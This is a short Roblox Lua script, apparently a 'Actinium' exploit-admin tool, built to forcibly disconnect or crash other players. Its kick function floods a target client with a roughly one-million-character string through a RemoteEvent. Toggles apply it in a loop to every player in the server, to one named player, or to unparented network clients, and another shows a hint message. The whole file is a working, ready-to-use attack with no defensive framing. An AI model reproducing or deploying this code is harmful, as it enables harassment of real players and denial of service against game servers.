--// Made by jillmiles1 \\--

local Shutdown = false
local KickNils = false
local ShowMessage = false
local Kick = false

local Player = "zachmm03"
local Message = [[Updated Actinium client via github]]

kick = function(scrub)
     local kick=Instance.new('RemoteEvent',workspace)
     kick:FireClient(scrub,{string.rep("umad?",2e5+5)})
     delay(1,function()
        pcall(function() kick:remove() end) 
     end)
end

function a()

if Shutdown then
   repeat
       wait(1)
       for _,plr in pairs(game.Players:GetPlayers()) do
          kick(plr)
       end
   until potato
end
if Kick then
    for _,v in pairs(game.Players:GetPlayers()) do
        if v.Name:lower():find(Player:lower()) then
           kick(v) 
        end
    end
end
if KickNils then
   	for _,a in pairs(game:service'NetworkServer':children()) do
		if a:GetPlayer() then
			if a:GetPlayer().Parent~=game:service'Players' then
            	local Run,Error=ypcall(function()
            	   	kick(a:GetPlayer())
            	   	
				end)
			end
		end
	end 
end
if ShowMessage then
   local H=Instance.new('Hint',workspace)
   H.Text = '[Actinium]: '..Message:gsub('','\5')
   delay(4,function()
       pcall(function() H:remove() end)
   end)
end

end

a()
